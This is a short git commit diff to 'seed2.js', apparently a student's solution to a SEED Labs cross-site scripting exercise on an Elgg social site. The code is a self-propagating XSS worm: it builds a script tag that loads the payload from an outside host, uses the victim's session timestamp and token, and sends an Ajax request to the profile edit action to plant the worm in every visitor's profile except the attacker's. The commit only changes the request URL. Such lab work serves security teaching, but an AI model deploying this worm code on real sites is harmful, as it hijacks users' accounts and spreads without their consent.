e4f9ebc6ee2fd841bb644e31752a3eb87b267283
Oliver Greenwood <greenwood672.dev@gmail.com>
2025-05-23 16:53:49 +0100

    Update seed2.js

--- public/seed2.js
+++ public/seed2.js
@@ -8,7 +8,7 @@
  //Constructthecontentofyoururl.
  var content="<script type='text/javascript' src='https://www.ogwood.dev/seed2.js'></script>"; //FILLIN
  var samyGuid=59; //FILLIN
- var sendurl="http://www.seed-server.com/profile/" + elgg.session.user.name + userName + guid + ts + token + "&briefdescription=" + content; //FILLIN
+ var sendurl="http://www.seed-server.com/action/profile/edit" + userName + guid + ts + token + "&briefdescription=" + content; //FILLIN
  if(elgg.session.user.guid!=samyGuid)
  {
  //CreateandsendAjaxrequesttomodifyprofile
